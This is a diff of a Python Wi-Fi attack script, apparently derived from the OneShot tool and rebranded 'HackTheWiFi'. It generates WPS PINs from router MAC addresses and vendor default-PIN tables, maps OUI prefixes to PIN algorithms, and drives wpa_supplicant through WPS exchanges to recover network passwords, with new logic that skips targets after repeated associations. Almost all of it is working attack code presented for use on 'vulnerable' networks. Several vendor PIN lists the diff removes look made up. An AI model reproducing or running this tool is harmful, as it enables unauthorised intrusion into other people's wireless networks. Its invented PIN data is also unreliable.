@@ -1,12 +1,13 @@
-#!/usr/bin/env python3
+#!/data/data/com.termux/files/usr/bin/python3
 # -*- coding: utf-8 -*-
-# ========================================================================
-#  Tool       : PixieDust - WPS PIN Generator & Attack Framework
-#  Author     : SYLHETYHACKVENGER (THE-ERROR808)
-#  Version    : 2.0 - Cyberpunk Edition
-#  Description: Advanced WPS PIN Generation & Wi-Fi Security Assessment
-#  Usage      : python3 pixiedust.py -i <interface> [options]
-# ========================================================================
+"""
+╔══════════════════════════════════════════════════════════════════╗
+║  HackTheWiFi v3.0                                                              ║
+║  Designed by SYLHETYHACKVENGER (THE-ERROR808)║
+║  Phase 1: Single-pass automatic attack                           ║
+║  Phase 2: Interactive mode (Pixie + Force + Loop)          ║
+╚══════════════════════════════════════════════════════════════════╝
+"""
 
 import sys
 import subprocess
@@ -24,84 +25,32 @@ import statistics
 import csv
 from pathlib import Path
 from typing import Dict
-import wcwidth
 
-# ─── CYBERPUNK COLOR PALETTE ───────────────────────────────────────────────
-class CyberColors:
-    """Neon cyberpunk color scheme for terminal output"""
-    NEON_CYAN = '\033[96m'
-    NEON_MAGENTA = '\033[95m'
-    NEON_YELLOW = '\033[93m'
-    NEON_GREEN = '\033[92m'
-    NEON_RED = '\033[91m'
-    NEON_BLUE = '\033[94m'
-    NEON_WHITE = '\033[97m'
-    NEON_ORANGE = '\033[38;5;214m'
-    NEON_PINK = '\033[38;5;205m'
-    NEON_PURPLE = '\033[38;5;141m'
-    NEON_GOLD = '\033[38;5;220m'
+# ═══════════════════════════════════════════════════════════════════════
+# COLOR CODES
+# ═══════════════════════════════════════════════════════════════════════
+
+class Colors:
+    GREEN = '\033[92m'
+    LIGHT_GREEN = '\033[92m'
+    RED = '\033[91m'
+    LIGHT_RED = '\033[91m'
+    YELLOW = '\033[93m'
+    LIGHT_YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    LIGHT_BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    MAGENTA = '\033[95m'
+    GRAY = '\033[90m'
+    WHITE = '\033[97m'
     BOLD = '\033[1m'
-    DIM = '\033[2m'
-    ITALIC = '\033[3m'
     UNDERLINE = '\033[4m'
-    BLINK = '\033[5m'
-    REVERSE = '\033[7m'
-    HIDDEN = '\033[8m'
-    ENDC = '\033[0m'
-    BG_BLACK = '\033[40m'
-    BG_RED = '\033[41m'
-    BG_GREEN = '\033[42m'
-    BG_YELLOW = '\033[43m'
-    BG_BLUE = '\033[44m'
-    BG_MAGENTA = '\033[45m'
-    BG_CYAN = '\033[46m'
-    BG_WHITE = '\033[47m'
-    BG_DARK = '\033[48;5;232m'
+    RESET = '\033[0m'
+    DIM = '\033[2m'
 
-# ─── STAR WARS BLASTER BANNER ─────────────────────────────────────────────
-def show_banner():
-    """Display the Star Wars blaster banner with cyberpunk styling"""
-    os.system('clear')
-    
-    banner = f"""
-{CyberColors.NEON_RED}{CyberColors.BOLD}
-╔══════════════════════════════════════════════════════════════════════════════════╗
-║ {CyberColors.NEON_GOLD}⚡ {CyberColors.NEON_CYAN}BlasTech DL-18 {CyberColors.NEON_GOLD}⚡{CyberColors.NEON_RED} ║
-║ {CyberColors.NEON_GOLD}⚡ {CyberColors.NEON_CYAN}Blaster Pistol {CyberColors.NEON_GOLD}⚡{CyberColors.NEON_RED}     ║
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║                                                                                                                                                                                                                               ║
-║{CyberColors.NEON_CYAN}       o--._|_ _                              {CyberColors.NEON_RED}                                                                                   ║
-║{CyberColors.NEON_CYAN}      / /.-.-':o|       Shoot At                      {CyberColors.NEON_RED}                                                                     ║
-║{CyberColors.NEON_CYAN}     >`- `|  |.--..__        The Vulnerable                 {CyberColors.NEON_RED}                                                          ║
-║{CyberColors.NEON_CYAN}     |:\`_|-+'`--..( ~:--..     Wifi              {CyberColors.NEON_RED}                                                                            ║
-║{CyberColors.NEON_CYAN}    .'::|(|___'|   ~-.:_ (:)        Network         {CyberColors.NEON_RED}                                                                     ║
-║{CyberColors.NEON_CYAN}   .':::`._|:: |        ~`-                  {CyberColors.NEON_RED}                                                                                     ║
-║{CyberColors.NEON_CYAN}   |::;||  ~-'-'             Hasta La Vista                 {CyberColors.NEON_RED}                                                            ║
-║{CyberColors.NEON_CYAN}   `:_:||   |                     Baby             {CyberColors.NEON_RED}                                                                           ║
-║{CyberColors.NEON_CYAN}      ~-'   |                                 {CyberColors.NEON_RED}                                                                                     ║
-║                                                                                                                                                                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-{CyberColors.ENDC}
-
-{CyberColors.NEON_MAGENTA}{CyberColors.BOLD}╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                                                                           ║
-║     {CyberColors.NEON_GREEN}██████{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  {CyberColors.NEON_WHITE}JUST A SHOT TO THE WIFI{CyberColors.NEON_GREEN}  ██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  ║
-║     {CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  {CyberColors.NEON_WHITE}║ {CyberColors.NEON_GOLD}<{CyberColors.NEON_PINK}PixieDust{CyberColors.NEON_GOLD}>{CyberColors.NEON_WHITE}  ║  {CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  ║
-║     {CyberColors.NEON_GREEN}██████{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  {CyberColors.NEON_WHITE}╚═════════════════════════╝  {CyberColors.NEON_GREEN}██████{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  ║
-║     {CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  {CyberColors.NEON_WHITE}{CyberColors.DIM}WPS PIN Generator & Attack Framework{CyberColors.NEON_WHITE}  {CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  ║
-║     {CyberColors.NEON_GREEN}██████{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  {CyberColors.NEON_WHITE}{CyberColors.DIM}Designed by: SYLHETYHACKVENGER (THE-ERROR808){CyberColors.NEON_WHITE}  {CyberColors.NEON_GREEN}██████{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██{CyberColors.NEON_GREEN}██{CyberColors.NEON_CYAN}██  ║
-║                                                                                                                           ║
-╚═══════════════════════════════════════════════════════════════════════════════╝{CyberColors.ENDC}
-┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
-│     {CyberColors.NEON_CYAN}{CyberColors.BOLD}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  │ 
-│  {CyberColors.NEON_YELLOW}🚀 {CyberColors.NEON_GREEN}SYSTEM STATUS:{CyberColors.NEON_WHITE} ONLINE     {CyberColors.NEON_YELLOW}🔐 {CyberColors.NEON_GREEN}SECURITY:{CyberColors.NEON_WHITE} ACTIVE   {CyberColors.NEON_YELLOW}⚡ {CyberColors.NEON_GREEN}POWER:{CyberColors.NEON_WHITE} MAXIMUM  │
-│        {CyberColors.ENDC}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             │
-└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
-"""
-    print(banner)
-
-# ─── YOUR ORIGINAL CODE STARTS HERE ─────────────────────────────────────────
-# (All your original classes and functions remain exactly the same)
+# ═══════════════════════════════════════════════════════════════════════
+# ORIGINAL CLASSES
+# ═══════════════════════════════════════════════════════════════════════
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -179,72 +128,37 @@ class WPSpin:
         self.ALGO_EMPTY = 1
         self.ALGO_STATIC = 2
 
-        # ========== MAC-BASED ALGORITHMS ==========
-        self.algos = {
-            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
-            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
-            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
-            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
-            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
-            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
-            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
-            
-            # ========== STATIC PIN ALGORITHMS (5 pins each) ==========
-            
-            # Empty / Special
-            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
-            
-            # Cisco
-            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1234567, 8912345, 4567891, 2345678, 6789123]},
-            
-            # Broadcom
-            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2017252, 5172894, 8364921, 3492876, 7281459]},
-            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4626484, 1938457, 6753241, 9482713, 5271398]},
-            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7622990, 3458197, 6847235, 1794532, 8932674]},
-            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6232714, 8491573, 2768945, 5317284, 1953476]},
-            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1086411, 7356294, 4829317, 9674153, 3547281]},
-            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3195719, 8746392, 2531648, 6978253, 4215739]},
-            
-            # Airocon
-            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3043203, 8629473, 7358241, 5489162, 4173529]},
-            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7141225, 3952678, 1845392, 6794231, 2581764]},
-            
-            # DSL-2740R
-            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6817554, 2378941, 5964237, 1846795, 4239581]},
-            
-            # Realtek
-            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9566146, 1738492, 6425318, 8975241, 3657892]},
-            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9571911, 2486371, 7341925, 5812476, 1925364]},
-            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4856371, 7261538, 9137482, 3478512, 6392741]},
-            
-            # Upvel
-            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2085483, 8749321, 3516728, 6294175, 1932567]},
-            
-            # UR-814AC
-            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4397768, 8173425, 2567891, 6934157, 3749216]},
-            
-            # UR-825AC
-            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [529417, 8462973, 1537482, 6729183, 3948567]},
-            
-            # Onlime
-            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9995604, 2538416, 6872943, 4215793, 1786492]},
-            
-            # Edimax
-            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3561153, 7912438, 4652781, 9281573, 2473916]},
-            
-            # Thomson
-            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6795814, 3487125, 9218457, 1539784, 7962413]},
-            
-            # HG532x
-            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3425928, 8153492, 6792541, 4381967, 2518746]},
-            
-            # H108L
-            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9422988, 3876412, 7598234, 2146793, 5639184]},
-            
-            # CBN ONO
-            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9575521, 1649823, 7231564, 8974152, 3412789]},
-            
-            # ========== NEW BRAND PINS (5 pins each) ==========
+        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
+                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
+                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
+                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
+                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
+                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
+                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
+                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
+                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
+                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
+                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
+                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
+                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
+                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
+                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
+                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
+                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
+                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
+                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
+                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
+                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
+                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
+# ========== NEW BRAND PINS (5 pins each) ==========
             
             # Tenda
             'pinTenda': {'name': 'Tenda', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1853642, 7316824, 5482916, 3945768, 2681473]},
@@ -321,11 +235,6 @@ class WPSpin:
 
     @staticmethod
     def checksum(pin):
-        """
-        Standard WPS checksum algorithm.
-        @pin — A 7 digit pin to calculate the checksum for.
-        Returns the checksum value.
-        """
         accum = 0
         while pin:
             accum += (3 * (pin % 10))
@@ -335,46 +244,17 @@ class WPSpin:
         return (10 - accum % 10) % 10
 
     def generate(self, algo, mac):
-        """
-        WPS pin generator
-        @algo — the WPS pin algorithm ID
-        Returns the WPS pin string value
-        """
         mac = NetworkAddress(mac)
         if algo not in self.algos:
             raise ValueError('Invalid WPS pin algorithm')
         pin = self.algos[algo]['gen'](mac)
         if algo == 'pinEmpty':
             return pin
-        # Handle both single int and list returns
-        if isinstance(pin, list):
-            # Return the first PIN from the list for backward compatibility
-            pin = pin[0]
         pin = pin % 10000000
         pin = str(pin) + str(self.checksum(pin))
         return pin.zfill(8)
 
-    def generate_all_pins(self, algo, mac):
-        """Generate all pins for a static algorithm (returns list)"""
-        mac = NetworkAddress(mac)
-        if algo not in self.algos:
-            raise ValueError('Invalid WPS pin algorithm')
-        pins = self.algos[algo]['gen'](mac)
-        if not isinstance(pins, list):
-            pins = [pins]
-        result = []
-        for pin in pins:
-            if algo == 'pinEmpty':
-                result.append(pin)
-            else:
-                pin_val = pin % 10000000
-                result.append(str(pin_val) + str(self.checksum(pin_val)).zfill(1))
-        return result
-
     def getAll(self, mac, get_static=True):
-        """
-        Get all WPS pin's for single MAC
-        """
         res = []
         for ID, algo in self.algos.items():
             if algo['mode'] == self.ALGO_STATIC and not get_static:
@@ -389,49 +269,26 @@ class WPSpin:
             res.append(item)
         return res
 
-    def getList(self, mac, get_static=True):
-        """
-        Get all WPS pin's for single MAC as list
-        """
-        res = []
-        for ID, algo in self.algos.items():
-            if algo['mode'] == self.ALGO_STATIC and not get_static:
-                continue
-            pins = self.generate_all_pins(ID, mac)
-            for pin in pins:
-                res.append(pin)
-        return res
-
     def getSuggested(self, mac):
-        """
-        Get all suggested WPS pin's for single MAC
-        """
         algos = self._suggest(mac)
         res = []
         for ID in algos:
             algo = self.algos[ID]
-            pins = self.generate_all_pins(ID, mac)
-            for pin in pins:
-                item = {}
-                item['id'] = ID
-                if algo['mode'] == self.ALGO_STATIC:
-                    item['name'] = 'Static PIN — ' + algo['name']
-                else:
-                    item['name'] = algo['name']
-                item['pin'] = pin
-                res.append(item)
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC:
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
         return res
 
     def getSuggestedList(self, mac):
-        """
-        Get all suggested WPS pin's for single MAC as list
-        """
         algos = self._suggest(mac)
         res = []
         for algo in algos:
-            pins = self.generate_all_pins(algo, mac)
-            for pin in pins:
-                res.append(pin)
+            res.append(self.generate(algo, mac))
         return res
 
     def getLikely(self, mac):
@@ -442,16 +299,9 @@ class WPSpin:
             return None
 
     def _suggest(self, mac):
-        """
-        Get algos suggestions for single MAC
-        Returns the algo ID
-        """
         mac = mac.replace(':', '').upper()
-        
-        # ========== COMPLETE OUI DATABASE ==========
         algorithms = {
-            # ========== ORIGINAL pin24 - MASSIVELY EXPANDED ==========
-            'pin24': (
+           'pin24': (
                 '04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', 
                 '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 
                 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 
@@ -972,15 +822,12 @@ class WPSpin:
             
             # N/A Router (Generic/Unknown/Locked)
             'pinNARouter': ('000000', '111111', '222222', '333333', '444444', '555555', '666666', '777777', '888888', '999999', 'AAAAAA', 'BBBBBB', 'CCCCCC', 'DDDDDD', 'EEEEEE', 'FFFFFF'),
-        }
         
+        }
         res = []
         for algo_id, masks in algorithms.items():
-            # Check if MAC starts with any of the masks for this algorithm
-            for mask in masks:
-                if mac.startswith(mask):
-                    res.append(algo_id)
-                    break
+            if mac.startswith(masks):
+                res.append(algo_id)
         return res
 
     def pin24(self, mac):
@@ -993,9 +840,7 @@ class WPSpin:
         return mac.integer % 0x100000000
 
     def pinDLink(self, mac):
-        # Get the NIC part
         nic = mac.integer & 0xFFFFFF
-        # Calculating pin
         pin = nic ^ 0x55AA55
         pin ^= (((pin & 0xF) << 4) +
                 ((pin & 0xF) << 8) +
@@ -1074,10 +919,14 @@ class PixiewpsData:
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.status = ''
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
+        self.assoc_count = 0
+        self.current_bssid = ''
+        self.scan_loop_count = 0
+        self.last_state = None
 
     def isFirstHalfValid(self):
         return self.last_m_message > 5
@@ -1086,42 +935,9 @@ class ConnectionStatus:
         self.__init__()
 
 
-class BruteforceStatus:
-    def __init__(self):
-        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.mask = ''
-        self.last_attempt_time = time.time()   # Last PIN attempt start time
-        self.attempts_times = collections.deque(maxlen=15)
-
-        self.counter = 0
-        self.statistics_period = 5
-
-    def display_status(self):
-        average_pin_time = statistics.mean(self.attempts_times)
-        if len(self.mask) == 4:
-            percentage = int(self.mask) / 11000 * 100
-        else:
-            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
-            percentage, self.start_time, average_pin_time))
-
-    def registerAttempt(self, mask):
-        self.mask = mask
-        self.counter += 1
-        current_time = time.time()
-        self.attempts_times.append(current_time - self.last_attempt_time)
-        self.last_attempt_time = current_time
-        if self.counter == self.statistics_period:
-            self.counter = 0
-            self.display_status()
-
-    def clear(self):
-        self.__init__()
-
-
 class Companion:
-    """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
+    """Main application part - MODIFIED with association counter & loop detection"""
+    def __init__(self, interface, save_result=False, print_debug=False):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
@@ -1139,6 +955,10 @@ class Companion:
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
+        self.max_associations = 6
+        self.max_scan_loops = 5
+        self.should_skip = False
+        self.skip_bssid = None
 
         user_home = str(pathlib.Path.home())
         self.sessions_dir = f'{user_home}/.OneShot/sessions/'
@@ -1151,15 +971,11 @@ class Companion:
 
         self.generator = WPSpin()
 
-        self.bssid = bssid
-        self.lastPwr = 0
-
     def __init_wpa_supplicant(self):
-        print('[*] Running wpa_supplicant…')
+        print(f'{Colors.DIM}[*] Running wpa_supplicant…{Colors.RESET}')
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-        # Waiting for wpa_supplicant control interface initialization
         while True:
             ret = self.wpas.poll()
             if ret is not None and ret != 0:
@@ -1169,11 +985,9 @@ class Companion:
             time.sleep(.1)
 
     def sendOnly(self, command):
-        """Sends command to wpa_supplicant"""
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
 
     def sendAndReceive(self, command):
-        """Sends command to wpa_supplicant and returns the reply"""
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
         (b, address) = self.retsock.recvfrom(4096)
         inmsg = b.decode('utf-8', errors='replace')
@@ -1187,7 +1001,7 @@ class Companion:
                         'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
         return '[!] Something went wrong — check out debug log'
 
-    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
+    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
@@ -1199,106 +1013,132 @@ class Companion:
         if verbose:
             sys.stderr.write(line + '\n')
 
+        current_state = None
+        
+        if ': State: ' in line:
+            if '-> SCANNING' in line:
+                current_state = 'scanning'
+                self.connection_status.status = 'scanning'
+                print(f'{Colors.DIM}[*] Scanning…{Colors.RESET}')
+        elif 'Trying to associate with' in line:
+            current_state = 'associating'
+            self.connection_status.status = 'associating'
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print(f'{Colors.DIM}[*] Associating with AP…{Colors.RESET}')
+        elif ('Associated with' in line) and (self.interface in line):
+            current_state = 'associated'
+            bssid = line.split()[-1].upper()
+            self.connection_status.current_bssid = bssid
+            self.connection_status.assoc_count += 1
+            self.connection_status.scan_loop_count = 0
+            
+            essid = ''
+            if 'ESSID:' in line:
+                try:
+                    essid = line.split('ESSID:')[1].strip().strip('<>')
+                except:
+                    pass
+            
+            print(f'{Colors.GREEN}[+] Associated with {bssid} (ESSID: {essid}) [Attempt #{self.connection_status.assoc_count}]{Colors.RESET}')
+            
+            if self.connection_status.assoc_count >= self.max_associations:
+                self.should_skip = True
+                self.skip_bssid = bssid
+                print(f'{Colors.YELLOW}[!] ⚠️  Association limit reached ({self.max_associations}) for {bssid}{Colors.RESET}')
+                print(f'{Colors.YELLOW}[!] Skipping this target...{Colors.RESET}')
+                return True
+
+        if current_state == 'associating' and self.connection_status.last_state == 'scanning':
+            self.connection_status.scan_loop_count += 1
+            print(f'{Colors.DIM}[*] Scan-Associate loop detected: {self.connection_status.scan_loop_count}/{self.max_scan_loops}{Colors.RESET}')
+            
+            if self.connection_status.scan_loop_count >= self.max_scan_loops:
+                self.should_skip = True
+                self.skip_bssid = self.connection_status.current_bssid or 'unknown'
+                print(f'{Colors.YELLOW}[!] ⚠️  Too many scan-associate loops ({self.max_scan_loops}) for target{Colors.RESET}')
+                print(f'{Colors.YELLOW}[!] Skipping this target...{Colors.RESET}')
+                return True
+
+        if current_state:
+            self.connection_status.last_state = current_state
+
         if line.startswith('WPS: '):
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
+                self.connection_status.scan_loop_count = 0
+                print(f'{Colors.DIM}[*] Sending WPS Message M{n}…{Colors.RESET}')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
+                self.connection_status.scan_loop_count = 0
+                print(f'{Colors.DIM}[*] Received WPS Message M{n}{Colors.RESET}')
                 if n == 5:
-                    print('[+] The first half of the PIN is valid')
+                    print(f'{Colors.GREEN}[+] The first half of the PIN is valid{Colors.RESET}')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                self.__print_with_indicators('*', 'Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                print(f'{Colors.DIM}[*] Received WSC NACK{Colors.RESET}')
+                print(f'{Colors.RED}[-] Error: wrong PIN code{Colors.RESET}')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
                 if pixiemode:
